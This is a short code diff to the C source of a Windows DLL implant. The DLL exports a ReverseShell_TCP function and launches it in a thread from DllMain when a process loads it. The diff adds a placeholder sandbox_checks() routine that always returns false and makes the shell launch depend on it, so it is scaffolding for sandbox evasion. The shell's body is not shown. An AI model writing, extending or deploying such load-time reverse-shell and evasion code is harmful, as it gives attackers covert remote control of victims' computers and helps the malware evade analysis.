@@ -8,6 +8,10 @@
 #define _UTF16(x)   L##x
 #define UTF16(x)    _UTF16(x)
 
+#define bool _Bool
+#define true 1
+#define false 0
+
 // Function to get the length of a string
 size_t strlen(const char* str) {
     const char* s = str;
@@ -15,6 +19,12 @@ size_t strlen(const char* str) {
         s++;
     }
     return s - str;
+}
+
+static bool sandbox_checks() {
+    bool is_sandbox = false;
+
+    return is_sandbox;
 }
 
 __declspec(dllexport) void ReverseShell_TCP(LPVOID param) {
@@ -82,7 +92,7 @@ __declspec(dllexport) void ReverseShell_TCP(LPVOID param) {
 
 BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved) {
     (void)hinstDLL; (void)lpvReserved;
-    if (fdwReason == DLL_PROCESS_ATTACH)
+    if (fdwReason == DLL_PROCESS_ATTACH && sandbox_checks())
         CreateThread(0, 0, (void*)ReverseShell_TCP, 0, 0, 0);
     return TRUE;
 }
